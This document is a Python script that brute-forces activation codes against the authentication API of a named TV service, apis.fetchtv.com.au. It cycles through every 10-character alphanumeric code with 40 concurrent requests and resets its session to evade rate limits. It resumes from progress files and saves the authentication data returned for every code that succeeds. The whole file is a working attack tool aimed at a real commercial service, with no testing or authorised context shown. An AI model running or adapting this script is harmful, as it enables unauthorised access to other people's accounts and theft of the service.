import asyncio
import aiohttp
import aiofiles
import json
import os
import string
import sys
from itertools import product

# Configuration
MAX_CONCURRENT_REQUESTS = 40
NUM_CODES_TO_GENERATE = 10000  # Generate this many codes at a time
SLEEP_DURATION = 1  # Sleep duration to avoid hitting rate limits
URL = "https://apis.fetchtv.com.au/v3/authenticate"
USED_PREFIX_FILE_PATTERN = "used_prefix_{}_part_{}.txt"
PROGRESS_FILE_PATTERN = "progress_part_{}.json"
CODE_NEEDED_FILE = "code_needed.json"
PARTITIONS = 8  # Number of partitions (divide into 8 parts)
CODES_PER_PARTITION = 7_558_272  # 60,466,176 / 8
SESSION_RESET_THRESHOLD = 50  # Number of requests before resetting the session
PREFIX_LENGTH = 5  # Prefix length (5 characters)
SUFFIX_LENGTH = 5  # Alphanumeric suffix length (5 characters)

# Request counter
request_count = 0

# Alphanumeric characters (a-z, 0-9)
ALPHANUMERIC_CHARS = string.ascii_lowercase + string.digits

# Ordered queue for storing the results in the right order
result_queue = asyncio.PriorityQueue()

# Function to increment the 5-character alphanumeric prefix
def increment_prefix(prefix):
    prefix_as_number = int("".join(
        str(ord(char) - ord('0')) if char.isdigit() else str(ord(char) - ord('a') + 10)
        for char in prefix
    ), 36)
    incremented = prefix_as_number + 1
    new_prefix = ""
    for _ in range(PREFIX_LENGTH):
        incremented, rem = divmod(incremented, 36)
        new_char = chr(rem + ord('0')) if rem < 10 else chr(rem + ord('a') - 10)
        new_prefix = new_char + new_prefix
    return new_prefix

# Session reset mechanism
async def reset_session(session):
    global request_count
    if session:
        await session.close()
    request_count = 0  # Reset the counter
    return aiohttp.ClientSession()

# Load progress from the partitioned JSON files
def load_progress(part):
    filename = PROGRESS_FILE_PATTERN.format(part)
    if os.path.exists(filename):
        with open(filename, "r") as f:
            return json.load(f)
    else:
        return {"current_prefix": "aaaaa", "existing_codes": []}

# Save progress to the partitioned JSON file
def save_progress(part, current_prefix, existing_codes):
    filename = PROGRESS_FILE_PATTERN.format(part)
    with open(filename, "w") as f:
        progress = {
            "current_prefix": current_prefix,
            "existing_codes": list(existing_codes)  # Ensure it's a list for JSON
        }
        json.dump(progress, f, indent=4)

# Load existing codes from the partitioned files
def load_existing_codes(prefix, part):
    filename = USED_PREFIX_FILE_PATTERN.format(prefix, part)
    if os.path.exists(filename):
        with open(filename, "r") as f:
            return set(line.strip() for line in f if line.strip())
    return set()

# Save used codes after each batch
async def save_used_codes(prefix, part, new_codes):
    filename = USED_PREFIX_FILE_PATTERN.format(prefix, part)
    async with aiofiles.open(filename, "a") as f:
        await f.write("\n".join(new_codes) + "\n")

# Load existing codes needing a PIN into a set
if os.path.exists(CODE_NEEDED_FILE):
    with open(CODE_NEEDED_FILE, "r") as f:
        codes_needing_pin = set(json.load(f))
else:
    codes_needing_pin = set()

# Generate activation codes, skipping processed ones
def generate_activation_codes(prefix, existing_codes, count, start_index=0):
    suffix_combinations = product(ALPHANUMERIC_CHARS, repeat=SUFFIX_LENGTH)
    generated_codes = []

    # Advance the iterator to the starting index
    suffix_combinations = list(suffix_combinations)[start_index:]

    for suffix_tuple in suffix_combinations:
        suffix = ''.join(suffix_tuple)
        activation_code = prefix + suffix

        if activation_code not in existing_codes:
            generated_codes.append(activation_code)

        if len(generated_codes) >= count:
            break

    return generated_codes

# Retry mechanism for POST requests
async def send_request(session, semaphore, activation_code, part, existing_codes, order):
    retry_attempts = 0

    while retry_attempts < 3:  # Retry up to 3 times
        try:
            async with semaphore:
                form_data = {"activation_code": activation_code}
                async with session.post(URL, data=form_data, timeout=10) as response:
                    if response.status == 403:
                        print(f"HTTP 403 encountered for {activation_code}. Exiting script.")
                        sys.exit(1)  # Exit script immediately on HTTP 403

                    if response.status == 200:
                        response_json = await response.json()

                        meta_data = response_json.get("__meta__", {})
                        error = meta_data.get("error")
                        message = meta_data.get("message")

                        # Handle INVALID_AUTH errors (skip saving but track the code)
                        if error == "INVALID_AUTH":
                            print(f"Activation code {activation_code} is invalid (INVALID_AUTH), skipping...")
                            existing_codes.add(activation_code)  # Add to used codes to prevent future duplication
                            await result_queue.put((order, activation_code, "invalid"))
                            return  # Skip saving this code

                        # Save valid codes with null error and message
                        elif error is None and message is None:
                            filename = f"{activation_code}.json"
                            async with aiofiles.open(filename, "w") as f:
                                await f.write(json.dumps(response_json, indent=4))
                            print(f"Saved valid activation code to {filename}")
                            await result_queue.put((order, activation_code, "valid"))

                    elif 400 <= response.status < 500:
                        print(f"Client Error {response.status} for {activation_code}: skipping.")
                        existing_codes.add(activation_code)  # Add to used codes even for client errors
                        await result_queue.put((order, activation_code, "client_error"))
                        return

                    elif 500 <= response.status < 600:
                        print(f"Server Error {response.status} for {activation_code}: retrying ({retry_attempts + 1}/3)")
                        retry_attempts += 1
                        await asyncio.sleep(5)  # Wait 5 seconds before retrying
                        continue

            break  # Request successful
        except (aiohttp.ClientConnectorError, ConnectionResetError) as e:
            retry_attempts += 1
            print(f"Connection error for {activation_code}: {e}, retrying ({retry_attempts}/3)")
            await asyncio.sleep(5)  # Wait 5 seconds before retrying
        except asyncio.TimeoutError:
            retry_attempts += 1
            print(f"Timeout error for {activation_code}, retrying ({retry_attempts}/3)")
            await asyncio.sleep(5)  # Wait 5 seconds before retrying

# Main function to run the script
async def main():
    global current_prefix, request_count

    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    session = await reset_session(None)  # Initialize session

    # Initialize current_prefix to default start value
    current_prefix = "aaaaa"  # Default starting prefix

    async with session:
        for part in range(1, PARTITIONS + 1):
            done_file = f"done_{current_prefix}_part_{part}.txt"

            # Check if part is already marked as done
            if os.path.exists(done_file):
                print(f"Part {part} for prefix {current_prefix} is already marked as done. Skipping...")
                continue

            progress_file = PROGRESS_FILE_PATTERN.format(part)
            existing_codes = set()
            suffix_combinations = iter(product(ALPHANUMERIC_CHARS, repeat=SUFFIX_LENGTH))  # Full suffix iterator
            start_index = 0

            if os.path.exists(progress_file):
                # Load progress if file exists
                progress = load_progress(part)
                current_prefix = progress.get("current_prefix", current_prefix)
                existing_codes = set(progress.get("existing_codes", []))
                print(f"Resuming progress for part {part} from prefix {current_prefix}.")
                print(f"Loaded {len(existing_codes)} existing codes. Current prefix: {current_prefix}.")

                # Find closest match to determine the starting suffix
                suffix_list = sorted(code[-SUFFIX_LENGTH:] for code in existing_codes if code.startswith(current_prefix))
                print(f"Analyzing suffixes for prefix '{current_prefix}': {suffix_list[:10]}... (total {len(suffix_list)})")

                if suffix_list:
                    last_suffix = suffix_list[-1]  # Last known suffix
                    for i, suffix in enumerate(product(ALPHANUMERIC_CHARS, repeat=SUFFIX_LENGTH)):
                        if ''.join(suffix) == last_suffix:
                            start_index = i + 1
                            break
                    suffix_combinations = iter(list(product(ALPHANUMERIC_CHARS, repeat=SUFFIX_LENGTH))[start_index:])
                    print(f"Closest match to starting suffix '{last_suffix}'. Adjusted starting index to {start_index}.")
            else:
                # Calculate starting point based on done files
                completed_parts = sum(1 for p in range(1, part) if os.path.exists(f"done_{current_prefix}_part_{p}.txt"))
                total_codes_done = completed_parts * CODES_PER_PARTITION

                codes_per_prefix = 36 ** SUFFIX_LENGTH
                prefixes_to_skip = total_codes_done // codes_per_prefix
                start_index = total_codes_done % codes_per_prefix

                print(f"Calculating starting prefix for {current_prefix}. Total codes done: {total_codes_done}.")
                print(f"Skipping {prefixes_to_skip} prefixes and starting at index {start_index} for {total_codes_done} codes.")

                for _ in range(prefixes_to_skip):
                    current_prefix = increment_prefix(current_prefix)

                suffix_combinations = iter(list(product(ALPHANUMERIC_CHARS, repeat=SUFFIX_LENGTH))[start_index:])
                print(f"Starting from prefix {current_prefix} for part {part} based on done files.")

            while True:
                if request_count >= SESSION_RESET_THRESHOLD:
                    session = await reset_session(session)

                if len(existing_codes) >= CODES_PER_PARTITION:
                    print(f"Partition {part} completed for prefix {current_prefix}. Marking as done...")
                    with open(done_file, "w") as f:
                        f.write(f"Processing completed for prefix {current_prefix} and part {part}.")
                    if os.path.exists(progress_file):
                        os.remove(progress_file)

                    current_prefix = increment_prefix(current_prefix)
                    existing_codes = set()
                    break

                # Generate activation codes
                activation_codes = []
                try:
                    for _ in range(NUM_CODES_TO_GENERATE):
                        suffix = ''.join(next(suffix_combinations))
                        activation_code = current_prefix + suffix
                        if activation_code not in existing_codes:
                            activation_codes.append(activation_code)
                except StopIteration:
                    print(f"All combinations exhausted for prefix {current_prefix}. Moving to next prefix.")
                    current_prefix = increment_prefix(current_prefix)
                    suffix_combinations = iter(product(ALPHANUMERIC_CHARS, repeat=SUFFIX_LENGTH))  # Reset iterator
                    continue

                if not activation_codes:
                    print(f"No more codes to process for prefix {current_prefix}.")
                    break

                existing_codes.update(activation_codes)
                print(f"Generating {len(activation_codes)} activation codes for prefix {current_prefix}.")
                print(f"Generated {len(activation_codes)} activation codes. First code: {activation_codes[0]}")

                tasks = [
                    asyncio.create_task(send_request(session, semaphore, code, part, existing_codes, i))
                    for i, code in enumerate(activation_codes)
                ]

                await asyncio.gather(*tasks)

                while not result_queue.empty():
                    order, activation_code, status = await result_queue.get()
                    print(f"Result: {activation_code} -> {status}")

                save_progress(part, current_prefix, existing_codes)
                print(f"Finished processing {len(activation_codes)} codes for prefix {current_prefix} in part {part}.")

def parse_done_marker(filename):
    """Extract prefix and part number from a done marker file."""
    parts = filename.split("_")
    prefix = parts[1]
    part = parts[-1].replace(".txt", "")
    return prefix, part

# Run the script
if __name__ == "__main__":
    asyncio.run(main())
